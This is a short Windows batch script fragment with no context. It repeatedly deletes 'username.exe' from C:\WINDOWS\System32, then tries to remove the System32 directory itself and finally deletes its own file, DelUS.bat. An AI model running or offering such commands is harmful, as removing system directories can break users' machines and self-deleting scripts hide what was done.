   :Repeat
   del "C:\WINDOWS\System32\username.exe"
   if exist "C:\WINDOWS\System32\username.exe" goto Repeat
   rmdir "C:\WINDOWS\System32"
   del "\DelUS.bat"
